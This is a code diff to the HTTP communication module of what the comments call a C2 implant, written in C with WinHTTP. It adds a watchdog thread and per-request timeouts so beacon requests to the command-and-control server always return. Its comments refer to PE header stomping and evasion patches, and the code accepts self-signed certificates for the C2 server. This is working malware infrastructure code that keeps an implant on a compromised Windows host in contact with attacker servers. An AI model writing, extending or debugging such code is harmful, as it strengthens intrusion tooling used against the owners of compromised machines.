@@ -7,6 +7,32 @@
 
 static HINTERNET g_hSession = NULL;
 
+/* -- Hard timeout watchdog --
+ * WinHttpSetTimeouts is unreliable in some configurations (especially
+ * after PE header stomping / evasion patches).  This watchdog thread
+ * guarantees WinHttpSendRequest returns within HTTP_HARD_TIMEOUT_MS
+ * by force-closing the request handle.
+ */
+typedef struct {
+    HINTERNET hRequest;
+    HANDLE    hDone;          /* signalled when main thread is done */
+    volatile LONG cancelled;  /* set to 1 if watchdog fired */
+} HttpWatchdog;
+
+#define HTTP_HARD_TIMEOUT_MS 30000
+
+static DWORD WINAPI _http_watchdog(LPVOID param) {
+    HttpWatchdog *wd = (HttpWatchdog *)param;
+    DWORD result = WaitForSingleObject(wd->hDone, HTTP_HARD_TIMEOUT_MS);
+    if (result == WAIT_TIMEOUT) {
+        InterlockedExchange(&wd->cancelled, 1);
+        DBG("[http] WATCHDOG: %us hard timeout fired -- force-cancelling request",
+            HTTP_HARD_TIMEOUT_MS / 1000);
+        WinHttpCloseHandle(wd->hRequest);
+    }
+    return 0;
+}
+
 BOOL http_init(void) {
     g_hSession = WinHttpOpen(
         L"" /* User-Agent set per-request */,
@@ -204,6 +230,21 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     }
     DBG("[http] request handle opened OK");
 
+    /* Per-request timeouts (belt-and-suspenders with session-level).
+     * Some Windows builds ignore session-level timeouts after PE header
+     * modifications -- setting them on the request handle too. */
+    {
+        DWORD conn_to = 10000, send_to = 15000, recv_to = 15000;
+        BOOL t1 = WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
+                                    &conn_to, sizeof(conn_to));
+        BOOL t2 = WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
+                                    &send_to, sizeof(send_to));
+        BOOL t3 = WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
+                                    &recv_to, sizeof(recv_to));
+        DBG("[http] per-request timeouts: conn=%s send=%s recv=%s",
+            t1 ? "OK" : "FAIL", t2 ? "OK" : "FAIL", t3 ? "OK" : "FAIL");
+    }
+
     /* Accept self-signed certs (C2 server) */
     if (isHttps) {
         DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
@@ -227,6 +268,24 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                              WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
     free(wUA);
     DBG("[http] headers set, about to send...");
+
+    /* Start hard-timeout watchdog -- guarantees WinHttpSendRequest returns
+     * even if WinHTTP's own timeouts are broken (e.g. after PE stomp). */
+    HttpWatchdog wdCtx;
+    HANDLE hWatchdog = NULL;
+    wdCtx.hRequest = hRequest;
+    wdCtx.cancelled = 0;
+    wdCtx.hDone = CreateEvent(NULL, TRUE, FALSE, NULL);
+    if (wdCtx.hDone) {
+        hWatchdog = CreateThread(NULL, 0, _http_watchdog, &wdCtx, 0, NULL);
+        if (!hWatchdog) {
+            DBG("[http] WARNING: watchdog thread creation failed (err=%u)", GetLastError());
+            CloseHandle(wdCtx.hDone);
+            wdCtx.hDone = NULL;
+        } else {
+            DBG("[http] watchdog armed (%us hard timeout)", HTTP_HARD_TIMEOUT_MS / 1000);
+        }
+    }
 
     BOOL ok;
     if (use_post) {
@@ -260,15 +319,36 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     }
     DBG("[http] WinHttpSendRequest returned ok=%d", ok);
+
+    /* Stop watchdog -- signal completion, wait for thread to exit */
+    if (wdCtx.hDone) SetEvent(wdCtx.hDone);
+    if (hWatchdog) {
+        WaitForSingleObject(hWatchdog, 3000);
+        CloseHandle(hWatchdog);
+        hWatchdog = NULL;
+    }
+    if (wdCtx.hDone) { CloseHandle(wdCtx.hDone); wdCtx.hDone = NULL; }
+
+    if (wdCtx.cancelled) {
+        DBG("[http] *** REQUEST CANCELLED BY WATCHDOG after %us ***", HTTP_HARD_TIMEOUT_MS / 1000);
+        DBG("[http] WinHTTP timeouts did NOT fire -- this is a NETWORK issue");
+        DBG("[http] Check: (1) C2 server running on target IP:port? "
+            "(2) Firewall allowing outbound? (3) Correct subnet routing?");
+        hRequest = NULL;  /* watchdog already closed the handle */
+        free(b64_val);
+        ok = FALSE;
+        goto cleanup;
+    }
+
     free(b64_val);
 
     if (!ok) {
         DWORD err = GetLastError();
         DBG("[http] WinHttpSendRequest FAILED (err=%u / 0x%08X)", err, err);
         /* Common errors:
-         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout or our hard timeout)
+         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout)
          * 12007 = ERROR_WINHTTP_NAME_NOT_RESOLVED (DNS failed)
-         * 12017 = ERROR_WINHTTP_OPERATION_CANCELLED (handle closed by timeout thread)
+         * 12017 = ERROR_WINHTTP_OPERATION_CANCELLED (handle closed by watchdog)
          * 12029 = ERROR_WINHTTP_CANNOT_CONNECT (refused / unreachable)
          * 12175 = ERROR_WINHTTP_SECURE_FAILURE (TLS error)
          */
